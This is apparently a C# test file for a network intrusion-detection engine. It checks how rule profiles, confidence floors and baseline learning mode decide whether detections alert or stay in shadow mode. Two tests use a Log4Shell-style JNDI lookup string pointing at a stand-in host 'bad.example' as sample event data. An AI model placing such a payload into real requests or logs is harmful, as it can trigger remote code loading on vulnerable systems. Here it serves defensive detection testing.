using System.Text.Json;
using Carthago.Engine.Rules;
using Carthago.Engine.Rules.Catalog;
using Carthago.Engine.Rules.Tuning;
using Carthago.Models;
using Carthago.Services;
using Carthago.Services.EnvironmentTuning;

namespace Carthago.Tests;

public sealed class RuleTuningCatalogTests
{
    [Fact]
    public void Every_Rule_Has_A_Tuning_Tier()
    {
        Assert.Equal(544, RuleCatalog.All.Count);
        Assert.All(RuleCatalog.All, descriptor =>
        {
            var decision = RuleTuningClassifier.Classify(descriptor);
            Assert.True(Enum.IsDefined(decision.Tier));
        });
    }

    [Fact]
    public void Alerting_Defaults_Have_Reasons_And_High_Fidelity_Floors()
    {
        var decisions = RuleTuningClassifier.Snapshot();

        Assert.All(decisions.Where(decision => decision.AlertsByDefault), decision => Assert.NotEmpty(decision.Reasons));
        Assert.All(decisions.Where(decision => decision.Tier == RuleTuningTier.HighFidelityAlert), decision => Assert.True(decision.ConfidenceFloor.HasValue && decision.ConfidenceFloor.Value >= 0.75));
    }

    [Fact]
    public void Baseline_Required_Rules_Declare_Baseline_Dependencies()
    {
        Assert.All(
            RuleTuningClassifier.Snapshot().Where(decision => decision.Tier == RuleTuningTier.BaselineRequired),
            decision =>
            {
                Assert.True(decision.RequiresBaseline);
                Assert.False(string.IsNullOrWhiteSpace(decision.BaselineDependency));
            });
    }

    [Fact]
    public void Environment_Specific_Rules_Declare_Profiles_Or_Asset_Config()
    {
        Assert.All(
            RuleTuningClassifier.Snapshot().Where(decision => decision.Tier is RuleTuningTier.EnvironmentSpecific or RuleTuningTier.DisabledUntilConfigured),
            decision => Assert.True(decision.RequiredProfiles.Count > 0 || decision.RequiredAssetConfiguration.Count > 0));
    }

    [Fact]
    public void HomeLab_Does_Not_Alert_On_Ot_Ics_By_Default()
    {
        Assert.NotEqual(RuleMode.Alert, RuleTuningCatalog.Resolve("HomeLab", Descriptor("R120")).DefaultMode);
        Assert.NotEqual(RuleMode.Alert, RuleTuningCatalog.Resolve("HomeLab", Descriptor("R223")).DefaultMode);
        Assert.NotEqual(RuleMode.Alert, RuleTuningCatalog.Resolve("HomeLab", Descriptor("R485")).DefaultMode);
    }

    [Fact]
    public void OtSegment_Alerts_On_Core_Ot_Rules_When_Configured()
    {
        var registry = new ApprovedAssetRegistry(new EnvironmentTuningOptions
        {
            Approved = new ApprovedEnvironmentOptions
            {
                OtSegments = { "10.20.0.0/24" },
                ModbusControllers = { "10.20.0.10" },
                BacnetControllers = { "10.20.0.11" }
            }
        });

        var modbus = CreateEvent("R120", 0.95, "10.30.0.20", "10.30.0.40", 502, "Modbus external write");
        var bacnet = CreateEvent("R121", 0.91, "10.30.0.50", "10.30.0.55", 47808, "BACnet who-is");
        var bacnetWrite = CreateEvent("R485", 0.98, "10.30.0.20", "10.30.0.30", 47808, "BACnet write property");

        Assert.Equal(RuleMode.Alert, RuleTuningCatalog.Resolve("OTSegment", Descriptor("R120"), modbus, CreateRecord(modbus), registry).EffectiveMode);
        Assert.Equal(RuleMode.Alert, RuleTuningCatalog.Resolve("OTSegment", Descriptor("R121"), bacnet, CreateRecord(bacnet), registry).EffectiveMode);
        Assert.Equal(RuleMode.Alert, RuleTuningCatalog.Resolve("OTSegment", Descriptor("R485"), bacnetWrite, CreateRecord(bacnetWrite), registry).EffectiveMode);
    }

    [Fact]
    public void IoTHeavy_Alerts_On_Iot_Rules()
    {
        var mqtt = CreateEvent("R113", 0.88, "10.40.0.21", "198.51.100.20", 1883, "MQTT broker connection to unapproved host");
        var telnet = CreateEvent("R117", 0.92, "10.40.0.21", "10.40.0.30", 23, "Telnet login attempt");

        Assert.Equal(RuleMode.Alert, RuleTuningCatalog.Resolve("IoTHeavy", Descriptor("R113"), mqtt, CreateRecord(mqtt), new ApprovedAssetRegistry(new EnvironmentTuningOptions())).EffectiveMode);
        Assert.Equal(RuleMode.Alert, RuleTuningCatalog.Resolve("IoTHeavy", Descriptor("R117"), telnet, CreateRecord(telnet), new ApprovedAssetRegistry(new EnvironmentTuningOptions())).EffectiveMode);
    }

    [Fact]
    public void Research_Profile_Remains_Explicit_And_Broad()
    {
        var profile = RuleTuningCatalog.GetProfile("Research");
        var decision = RuleTuningCatalog.Resolve("Research", Descriptor("R295"), CreateEvent("R295", 0.98, "10.0.0.12", "203.0.113.20", 6443, "pods/exec"), new TrafficRecord());

        Assert.True(profile.ResearchOnly);
        Assert.Equal(RuleMode.Alert, decision.DefaultMode);
    }

    [Fact]
    public void Explicit_PerRule_Override_Wins_Over_Profile_Default()
    {
        var path = WriteConfig(new
        {
            Profile = "HomeLab",
            Rules = new Dictionary<string, object>
            {
                ["R485"] = new { Mode = "Alert" }
            }
        });

        try
        {
            RuleEngine.LoadConfig(path);
            Assert.Equal(RuleMode.Alert, RuleEngine.GetRuleMode("R485", defaultEnabled: true));
        }
        finally
        {
            RuleEngine.LoadConfig();
            File.Delete(path);
        }
    }

    [Fact]
    public void Invalid_Profile_Keeps_Previous_Active_Profile()
    {
        var validPath = WriteConfig(new { Profile = "HomeLab" });
        var invalidPath = WriteConfig(new { Profile = "DefinitelyNotAProfile" });

        try
        {
            RuleEngine.LoadConfig(validPath);
            var previousMode = RuleEngine.GetRuleMode("R485", defaultEnabled: true);

            RuleEngine.LoadConfig(invalidPath);

            Assert.Equal(previousMode, RuleEngine.GetRuleMode("R485", defaultEnabled: true));
        }
        finally
        {
            RuleEngine.LoadConfig();
            File.Delete(validPath);
            File.Delete(invalidPath);
        }
    }

    [Fact]
    public void Low_Confidence_Alert_Rule_Downgrades_To_Shadow()
    {
        var evt = CreateEvent("R084", 0.41, "10.0.0.20", "203.0.113.40", 443, "${jndi:ldap://bad.example/a}");
        var decision = RuleTuningCatalog.Resolve("SmallBusiness", Descriptor("R084"), evt, CreateRecord(evt), new ApprovedAssetRegistry(new EnvironmentTuningOptions()));

        Assert.Equal(RuleMode.Shadow, decision.EffectiveMode);
    }

    [Fact]
    public void High_Confidence_Alert_Rule_Remains_Alert()
    {
        var evt = CreateEvent("R084", 0.96, "10.0.0.20", "203.0.113.40", 443, "${jndi:ldap://bad.example/a}");
        var decision = RuleTuningCatalog.Resolve("SmallBusiness", Descriptor("R084"), evt, CreateRecord(evt), new ApprovedAssetRegistry(new EnvironmentTuningOptions()));

        Assert.Equal(RuleMode.Alert, decision.EffectiveMode);
    }

    [Fact]
    public void Baseline_Required_Rule_Does_Not_Alert_During_Learning_Mode()
    {
        var evt = CreateEvent("R102", 0.95, "10.0.0.20", "8.8.8.8", 53, "averylonglabelthatsuggeststunneling.example.com");
        var decision = RuleTuningCatalog.Resolve("HomeLab", Descriptor("R102"), evt, CreateRecord(evt), new ApprovedAssetRegistry(new EnvironmentTuningOptions()), baselineLearningMode: true);

        Assert.Equal(RuleMode.Shadow, decision.EffectiveMode);
    }

    private static RuleDescriptor Descriptor(string ruleId)
        => RuleCatalog.Find(ruleId) ?? throw new InvalidOperationException($"Missing descriptor for {ruleId}.");

    private static DetectionEvent CreateEvent(string ruleId, double confidence, string sourceIp, string destinationIp, int destinationPort, string description)
        => new()
        {
            RuleId = ruleId,
            RuleName = Descriptor(ruleId).Name,
            ConfidenceScore = confidence,
            Description = description,
            Summary = description,
            Evidence = description,
            TimestampUtc = new DateTime(2026, 4, 28, 12, 0, 0, DateTimeKind.Utc),
            SourceIp = sourceIp,
            DestinationIp = destinationIp,
            DestinationHost = destinationIp,
            DestinationPort = destinationPort,
            Protocol = destinationPort switch
            {
                53 => "DNS",
                1883 => "MQTT",
                23 => "Telnet",
                47808 => "BACnet",
                502 => "Modbus",
                _ => "HTTP"
            },
            Severity = SeverityLevel.High
        };

    private static TrafficRecord CreateRecord(DetectionEvent evt)
        => new()
        {
            Source = evt.SourceIp,
            Destination = evt.DestinationIp,
            DestinationPort = evt.DestinationPort,
            Protocol = evt.Protocol,
            Info = evt.Description,
            HttpHost = evt.DestinationHost,
            HttpUri = evt.Description,
            DnsQname = evt.Protocol == "DNS" ? evt.Description : null,
            ApplicationProtocol = evt.Protocol,
            ApplicationService = evt.Protocol,
            IsTcp = evt.DestinationPort is 23 or 443 or 502 or 1883 or 47808,
            IsUdp = evt.DestinationPort == 53
        };

    private static string WriteConfig(object config)
    {
        var path = Path.Combine(Path.GetTempPath(), $"carthago-rules-{Guid.NewGuid():N}.json");
        var json = JsonSerializer.Serialize(config, new JsonSerializerOptions { WriteIndented = true });
        File.WriteAllText(path, json);
        return path;
    }
}
